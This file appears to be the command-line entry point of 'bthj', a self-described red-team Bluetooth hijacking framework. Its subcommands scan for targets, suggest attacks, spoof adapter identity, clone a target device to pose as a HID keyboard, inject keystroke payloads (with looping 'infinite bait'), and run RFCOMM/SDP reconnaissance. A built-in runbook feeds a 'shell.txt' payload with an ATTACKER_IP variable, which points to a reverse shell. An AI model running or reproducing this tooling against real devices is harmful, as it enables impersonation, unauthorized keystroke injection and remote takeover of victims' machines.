from __future__ import annotations

import argparse
import json
import sys
import time

from bthj import TOOL_NAME, __author__, __version__
from bthj.hal import BackendError, UnsupportedBackend, get_backend
from bthj.jam import ubertooth_check
from bthj.models import AttackSuggestion, Device, Profile, Report
from bthj.profiler import profile_device, suggest_attacks
from bthj.spoof import KEYBOARD_CLASS, MOUSE_CLASS, spoof_class, spoof_name

BANNER = f"{TOOL_NAME} {__version__} \u2014 {__author__}: Bluetooth hijacking framework (red-team)"
REPORT_SOURCE = f"{TOOL_NAME}/{__version__} ({__author__})"


def _render_device(dev: Device) -> str:
    name = dev.name or "?"
    rssi = f" {dev.rssi}dBm" if dev.rssi is not None else ""
    cls = f" class=0x{dev.device_class:06x}" if dev.device_class else ""
    return f"  {dev.address}  {name:<24}{rssi}{cls}"


def _render_attack(sug: AttackSuggestion) -> str:
    pads = " " * (12 - len(sug.module))
    bar = "#" * int(sug.confidence * 10)
    return f"  [{sug.module}]{pads} {sug.name}\n        conf {sug.confidence:.2f} ({bar:<10})"


def _render_profile(p: Profile) -> str:
    parts = [f"transport={p.transport}"]
    if p.cod_major:
        parts.append(f"major={p.cod_major}")
    if p.hints:
        parts.append(f"hints={','.join(p.hints)}")
    return "  " + " | ".join(parts)


def _report(source: str, cmd: str, arguments: dict) -> Report:
    return Report(source=source, cmd=cmd, arguments=arguments)


def _parse_channel_range(text: str) -> list[int]:
    channels: list[int] = []
    for part in text.split(","):
        part = part.strip()
        if not part:
            continue
        if "-" in part:
            lo, _, hi = part.partition("-")
            try:
                lo_i, hi_i = int(lo, 0), int(hi, 0)
            except ValueError:
                continue
            channels.extend(range(max(1, lo_i), min(63, hi_i) + 1))
        else:
            try:
                channels.append(int(part, 0))
            except ValueError:
                continue
    return sorted({c for c in channels if 1 <= c <= 63})


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        prog="bthj",
        description=f"{BANNER} BleuZ backend by default.",
    )
    parser.add_argument(
        "--version", action="version",
        version=f"{TOOL_NAME} {__version__} \u2014 {__author__}",
    )
    parser.add_argument(
        "--backend",
        choices=["bluez", "sim"],
        default="bluez",
        help="backend driver (sim = offline demo)",
    )
    common = argparse.ArgumentParser(add_help=False)
    common.add_argument("--json", action="store_true", help="emit machine-readable JSON")
    common.add_argument("--out", metavar="REPORT.json", help="write report to file")
    sub = parser.add_subparsers(dest="cmd", required=True)

    p_scan = sub.add_parser("scan", parents=[common], help="discover Bluetooth devices")
    p_scan.add_argument("--timeout", type=int, default=8, help="scan duration (s)")
    p_scan.add_argument("--passive", action="store_true", help="passive (LE) scan")

    p_probe = sub.add_parser("probe", parents=[common], help="profile a target and suggest attacks")
    p_probe.add_argument("target", help="target BD_ADDR")
    p_probe.add_argument("--timeout", type=int, default=6)

    sub.add_parser("info", parents=[common], help="show controller capabilities")

    p_spoof = sub.add_parser("spoof", parents=[common], help="impersonate a device identity")
    p_spoof.add_argument("--name", help="adapter alias to advertise")
    p_spoof.add_argument("--class", dest="device_class", type=lambda v: int(v, 0),
                         help="Device Class (hex or decimal)")
    p_spoof.add_argument("--keyboard", action="store_true", help="set Computer/Keyboard class")
    p_spoof.add_argument("--mouse", action="store_true", help="set Computer/Mouse class")

    p_impersonate = sub.add_parser("impersonate", aliases=["clone"], parents=[common],
                                   help="clone a target's identity, advertise as HID, and fire")
    p_impersonate.add_argument("clone_target", nargs="?",
                               help="BD_ADDR of device to clone (probes name/class)")
    p_impersonate.add_argument("--identity-name", help="explicit name to spoof (skip probe)")
    p_impersonate.add_argument("--identity-class", type=lambda v: int(v, 0),
                               help="explicit Device Class to spoof")
    p_impersonate.add_argument("--keyboard", action="store_true", help="use Computer/Keyboard class")
    p_impersonate.add_argument("--mouse", action="store_true", help="use Computer/Mouse class")
    p_impersonate.add_argument("--script", help="payload text (Ducky-ish syntax)")
    p_impersonate.add_argument("--script-file", help="load payload from file")
    p_impersonate.add_argument("--interval", type=float, default=0.01,
                               help="release-to-next delay (s)")
    p_impersonate.add_argument("--hold", type=float, default=0.02,
                               help="key hold time (s)")
    p_impersonate.add_argument("--countdown", type=float, default=0.0,
                               help="seconds to wait after client connects before firing")
    p_impersonate.add_argument("--gadget-name", help="override advertised name (default = identity name)")
    p_impersonate.add_argument("--timeout", type=float, default=120.0,
                               help="max wait for client to connect (s)")
    p_impersonate.add_argument("--no-restore", dest="restore", action="store_false",
                               help="do not restore original adapter name after run")
    p_impersonate.add_argument("--var", action="append", default=[],
                               metavar="NAME=value", help="substitute {{NAME}} token (repeatable)")
    p_impersonate.add_argument("--loop", action="store_true",
                               help="keep cloning identity and re-fire on every re-association")
    p_impersonate.add_argument("--forever", action="store_true",
                               help="alias for --loop (infinite bait)")
    p_impersonate.add_argument("--max-fires", type=int, default=1,
                               help="number of times to fire before exiting (default 1)")

    p_hid = sub.add_parser("ble-hid", parents=[common], help="BLE HID injection (GATT keyboard gadget)")
    p_hid.add_argument("--script", help="payload text (newline-delimited, Ducky-ish syntax)")
    p_hid.add_argument("--script-file", help="load payload from file (one step per line)")
    p_hid.add_argument("--interval", type=float, default=0.01, help="release-to-next delay (s)")
    p_hid.add_argument("--hold", type=float, default=0.02, help="key hold time (s)")
    p_hid.add_argument("--countdown", type=float, default=0.0, help="seconds to wait between client connected and firing")
    p_hid.add_argument("--gadget-name", default="Logitech BT Keyboard")
    p_hid.add_argument("--timeout", type=float, default=120.0)
    p_hid.add_argument("--var", action="append", default=[],
                       metavar="NAME=value", help="substitute {{NAME}} token (repeatable)")
    p_hid.add_argument("--loop", action="store_true",
                       help="re-fire payload on every re-association until --timeout")
    p_hid.add_argument("--max-fires", type=int, default=1,
                       help="number of times to fire before exiting (default 1)")

    sub.add_parser("self-test", parents=[common], help="check tooling and controller posture")

    p_rfcomm = sub.add_parser("rfcomm", aliases=["sweep"], parents=[common],
                              help="Classic RFCOMM/SDP/HID-channel reconnaissance over raw L2CAP")
    p_rfcomm.add_argument("target", help="target BD_ADDR")
    p_rfcomm.add_argument("--channels", default="1-30", metavar="RANGE",
                          help="channel range to probe, e.g. 1-30 or 2,5")
    p_rfcomm.add_argument("--connect-timeout", type=float, default=4.0,
                          help="L2CAP connect timeout (s)")
    p_rfcomm.add_argument("--channel-timeout", type=float, default=0.4,
                          help="per-channel probe timeout (s)")
    p_rfcomm.add_argument("--psm", type=lambda v: int(v, 0), default=0x3,
                          help="RFCOMM PSM to probe (default 0x3)")
    p_rfcomm.add_argument("--skip-sdp", action="store_true",
                          help="do not browse target SDP records")
    p_rfcomm.add_argument("--skip-hid-psms", action="store_true",
                          help="do not probe HIDP control/interrupt PSMs (0x11/0x13)")

    sub.add_parser("doctor", parents=[common],
                   help="diagnose host readiness and runbook for a real engagement")

    args = parser.parse_args(argv)

    try:
        backend = get_backend(args.backend)
    except (BackendError, UnsupportedBackend) as exc:
        print(f"bthj: {exc}", file=sys.stderr)
        return 2

    report = _report(source=REPORT_SOURCE, cmd=args.cmd, arguments=vars(args))

    def log(level: str, msg: str, **kw):
        report.add_event(level, msg, **kw)

    try:
        if args.cmd == "info":
            info = backend.controller_info()
            report.artifacts.append(json.dumps(info, indent=2))
            log("info", "controller info gathered")
            _emit(args, report, payload=info)

        elif args.cmd == "scan":
            devices = backend.discover(args.timeout, passive=args.passive)
            report.devices = [d.to_dict() for d in devices]
            log("info", f"discovered {len(devices)} device(s)")
            _emit(args, report, lines=[_render_device(d) for d in devices])

        elif args.cmd == "probe":
            devices = backend.discover(args.timeout, passive=True)
            target = next((d for d in devices if d.address == args.target), None)
            if target is None:
                target = Device(address=args.target)
            profile = profile_device(target)
            attacks = suggest_attacks(profile, target)
            report.devices = [target.to_dict()]
            report.attacks = [a.__dict__ for a in attacks]
            lines = [_render_device(target), _render_profile(profile), ""]
            lines += [a for a in (_render_attack(a) for a in attacks)]
            _emit(args, report, lines=lines)

        elif args.cmd == "spoof":
            work = []
            clobber = []
            if args.keyboard:
                spoof_class(backend, KEYBOARD_CLASS)
                work.append("class set to Computer/Keyboard (0x2540)")
            if args.mouse:
                spoof_class(backend, MOUSE_CLASS)
                work.append("class set to Computer/Mouse (0x2580)")
            if args.device_class is not None:
                spoof_class(backend, args.device_class)
                work.append(f"class set to 0x{args.device_class:06x}")
            if args.name:
                spoof_name(backend, args.name)
                work.append(f"adapter alias -> '{args.name}'")
                clobber.append(args.name)
            report.artifacts = work
            for item in work:
                log("info", item)
            _emit(args, report, lines=work)

        elif args.cmd == "ble-hid":
            from bthj.hid_ble import (
                BluezHidGadget,
                count_keystrokes,
                describe_payload,
                estimate_duration,
                parse_payload,
            )
            from bthj.payloads import load_payload, missing_tokens, parse_vars

            try:
                variables = parse_vars(args.var)
            except ValueError as exc:
                print(f"bthj: {exc}", file=sys.stderr)
                return 2
            try:
                payload_text = load_payload(text=args.script, path=args.script_file,
                                            variables=variables)
            except ValueError as exc:
                print(f"bthj: {exc}", file=sys.stderr)
                return 2
            missing = missing_tokens(payload_text)
            if missing:
                print(
                    "bthj: missing payload tokens: " + ", ".join(f"{{{{{m}}}}}" for m in missing),
                    file=sys.stderr,
                )
                return 2

            actions = parse_payload(payload_text, interval=args.interval, hold=args.hold)
            keys = count_keystrokes(actions)
            est_ms = estimate_duration(actions) * 1000
            print(
                f"payload: {keys} keystrokes, ~{est_ms:.0f} ms once fired"
                + (f", {args.countdown}s countdown after subscribe" if args.countdown else "")
            )
            if keys == 0:
                print("bthj: empty payload", file=sys.stderr)
                return 2
            report.artifacts.append(describe_payload(actions))
            log("info", "payload ready",
                keystrokes=keys, est_ms=round(est_ms), countdown=args.countdown)

            gadget = BluezHidGadget(name=args.gadget_name)

            def on_state(msg: str) -> None:
                print(f"[gadget] {msg}", flush=True)
                log("info", msg)

            max_fires = -1 if args.loop else args.max_fires
            sent = gadget.run(
                actions,
                timeout=args.timeout,
                interval=args.interval,
                countdown=args.countdown,
                max_fires=max_fires,
                on_state=on_state,
            )
            report.artifacts.append(f"sent {sent} HID reports")
            log("info", f"sent {sent} HID reports")
            _emit(args, report, lines=[f"sent {sent} HID reports"])

        elif args.cmd in ("impersonate", "clone"):
            from bthj.impersonate import probe_identity, run_attack
            from bthj.payloads import load_payload, missing_tokens, parse_vars

            try:
                variables = parse_vars(args.var)
                payload_text = load_payload(text=args.script, path=args.script_file,
                                            variables=variables)
            except ValueError as exc:
                print(f"bthj: {exc}", file=sys.stderr)
                return 2
            missing = missing_tokens(payload_text)
            if missing:
                print(
                    "bthj: missing payload tokens: " + ", ".join(f"{{{{{m}}}}}" for m in missing),
                    file=sys.stderr,
                )
                return 2
            max_fires = -1 if (args.loop or args.forever) else args.max_fires

            identity_class = None
            probe_name = None
            if args.identity_name is None:
                if not args.clone_target:
                    print(
                        "bthj: need --identity-name or a target address to clone",
                        file=sys.stderr,
                    )
                    return 2
                probed = probe_identity(backend, args.clone_target)
                probe_name = probed.name
                identity_class = probed.device_class
                log("info", f"probed {args.clone_target}",
                    name=probe_name, device_class=identity_class)
                print(f"[spoof] probed {args.clone_target}: name={probe_name or '?'} class=0x{identity_class or 0:06x}")
            identity_name = args.identity_name or probe_name
            if not identity_name and not args.gadget_name:
                print("bthj: target has no name and no --identity-name given", file=sys.stderr)
                return 2

            if args.identity_class is not None:
                identity_class = args.identity_class
            if args.keyboard:
                identity_class = KEYBOARD_CLASS
            if args.mouse:
                identity_class = MOUSE_CLASS

            def on_state(msg: str) -> None:
                print(f"[imp] {msg}", flush=True)
                log("info", msg)

            sent = run_attack(
                backend,
                identity_name=identity_name or args.gadget_name or args.clone_target or "bt-device",
                identity_class=identity_class,
                script_text=payload_text,
                gadget_name=args.gadget_name,
                countdown=args.countdown,
                timeout=args.timeout,
                restore_after=bool(args.restore and max_fires == 1),
                interval=args.interval,
                hold=args.hold,
                max_fires=max_fires,
                on_state=on_state,
            )
            report.artifacts.append(f"sent {sent} HID reports")
            _emit(args, report, lines=[f"sent {sent} HID reports"])

        elif args.cmd == "rfcomm":
            from bthj.hid_classic import detect
            from bthj.rfcomm import SweepResult, summarize

            channels = _parse_channel_range(args.channels)
            if not channels:
                print(f"bthj: empty channel range '{args.channels}'", file=sys.stderr)
                return 2
            log("info", f"recon on {args.target}: sweep {len(channels)} RFCOMM channel(s) psm 0x{args.psm:x}"
                + ("" if args.skip_sdp else " + SDP browse")
                + ("" if args.skip_hid_psms else " + HID PSM probe"))
            result = detect(
                args.target,
                timeout=args.connect_timeout,
                connect_timeout=args.connect_timeout,
                channel_timeout=args.channel_timeout,
                include_sdps=not args.skip_sdp,
                include_psms=not args.skip_hid_psms,
            )
            if not args.skip_sdp:
                for r in result["sdp_records"]:
                    log("sdp", f"SDP rule: {r.get('name') or '?'} "
                        f"ch={r.get('rfcomm_channel')} "
                        f"uuids={','.join(r.get('service_uuids', []))}")
            if not args.skip_hid_psms:
                for name, ok in result["hid_psms"].items():
                    log("hid" if ok else "warning",
                        f"HIDP {name} PSM 0x{'11' if name == 'ctrl' else '13'}: {'open' if ok else 'closed'}")
            for entry in result["channels"]:
                if entry.status == "open":
                    log("open", f"RFCOMM channel {entry.channel} open", rtt_ms=entry.rtt_ms)
            if result["psm_error"]:
                log("warning", f"L2CAP connect to psm 0x{args.psm:x} failed: {result['psm_error']}")
            log("info", "recon complete: "
                f"reachable={result['reachable']} "
                f"open={[c.channel for c in result['channels'] if c.status == 'open']} "
                f"hid_uuid={result['hid_uuid_present']} hid_psms={result['hid_supported']}")
            report.devices = [{
                "address": args.target,
                "reachable": result["reachable"],
                "psm_error": result["psm_error"],
                "open_channels": [c.channel for c in result["channels"] if c.status == "open"],
                "channels": [c.__dict__ for c in result["channels"]],
                "sdp_records": result["sdp_records"],
                "hid_psms": result["hid_psms"],
                "hid_supported": result["hid_supported"],
                "hid_uuid_present": result["hid_uuid_present"],
            }]
            lines = summarize(SweepResult(
                target=args.target,
                reachable=result["reachable"],
                psm_error=result["psm_error"],
                channels=result["channels"],
            ))
            if not args.skip_sdp and result["sdp_records"]:
                lines.append(f"  {len(result['sdp_records'])} SDP record(s):")
                for r in result["sdp_records"]:
                    lines.append(
                        f"    - {r.get('name') or '?'}  ch={r.get('rfcomm_channel')}  "
                        f"{','.join(r.get('service_uuids', []))}"
                    )
            if not args.skip_hid_psms and result["reachable"]:
                lines.append(
                    "  HID: " + ", ".join(
                        f"{k}={v}" for k, v in result["hid_psms"].items()
                    ) + (f" (uuid {result['hid_uuid_present']})" if not args.skip_sdp else "")
                )
            _emit(args, report, lines=lines)

        elif args.cmd == "self-test":
            probe = {
                "controller": backend.controller_info(),
                "dbus": _dbus_ok(),
                "rf_hardware": ubertooth_check(),
                "notes": [
                    "rf_hardware.present=false => jamming/race/KNOB need Ubertooth or nRF",
                    "KNOB full exploit requires controller/FW with 1-byte encryption",
                ],
            }
            report.artifacts = [json.dumps(probe, indent=2)]
            log("info", "self-test completed")
            _emit(args, report, payload=probe)

        elif args.cmd == "doctor":
            import os
            import shutil

            checks = {
                "root": os.geteuid() == 0,
                "bluetoothctl": shutil.which("bluetoothctl") is not None,
                "btmgmt": shutil.which("btmgmt") is not None,
                "dbus_next": _dbus_ok(),
            }
            checks["controller"] = {}
            try:
                info = backend.controller_info()
                checks["controller"] = info
                checks["classic"] = True
            except BackendError as exc:
                checks["classic"] = False
                checks["controller_error"] = str(exc)
            lines = ["host readiness:"]
            lines += [f"  {'OK ' if v is True else 'NO '} {k}"
                      for k, v in checks.items() if isinstance(v, bool)]
            if checks["classic"]:
                addr = checks["controller"].get("address")
                name = checks["controller"].get("name")
                powered = checks["controller"].get("powered", False)
                lines.append(f"  controller {addr} '{name}' powered={powered}")
                lines.append(
                    "  classic: "
                    + ("BR/EDR ready" if powered else "adapter powered off (run: bthj info / bluetoothctl power on)")
                )
            lines.extend([
                "runbook (real engagement):",
                "  1.  scan  : bthj scan --timeout 15           (find targets, get BD_ADDR & class)",
                "  2.  recon : bthj rfcomm  <BD_ADDR>           (channels + SDP + HID PSMs)",
                ("  3.  clone : bthj impersonate <BD_ADDR> --script-file payloads/shell.txt"
                 "  --var ATTACKER_IP=1.2.3.4 --var HTTP_PORT=8000"),
                "  4.  note  : --class spoof requires root; auto-reconnect steal needs the victim's bond",
            ])
            report.artifacts = [json.dumps(checks, indent=2)]
            log("info", "doctor report generated")
            _emit(args, report, lines=lines)

        else:
            raise NotImplementedError(f"command {args.cmd} not wired")

        return 0
    except NotImplementedError as exc:
        report.error = f"not implemented: {exc}"
        log("error", str(exc))
        print(f"bthj: not implemented in this build: {exc}", file=sys.stderr)
        return 3
    except (BackendError, RuntimeError, OSError) as exc:
        report.error = str(exc)
        log("error", str(exc))
        print(f"bthj: {exc}", file=sys.stderr)
        return 1
    finally:
        report.finished_at = time.time()
        if args.out:
            with open(args.out, "w") as fh:
                json.dump(report.to_dict(), fh, indent=2)
    return 0


def _dbus_ok() -> bool:
    try:
        import dbus_next  # noqa: F401
    except ImportError:
        return False
    return True


def _emit(args: argparse.Namespace, report: Report, lines: list[str] | None = None,
          payload: dict | None = None) -> None:
    if payload is not None and not lines:
        lines = [f"{k}: {v}" for k, v in payload.items()]
    if args.json:
        if payload is not None:
            print(json.dumps(payload, indent=2))
        else:
            print(report.to_dict())
        return
    for line in lines or []:
        print(line)


if __name__ == "__main__":
    raise SystemExit(main())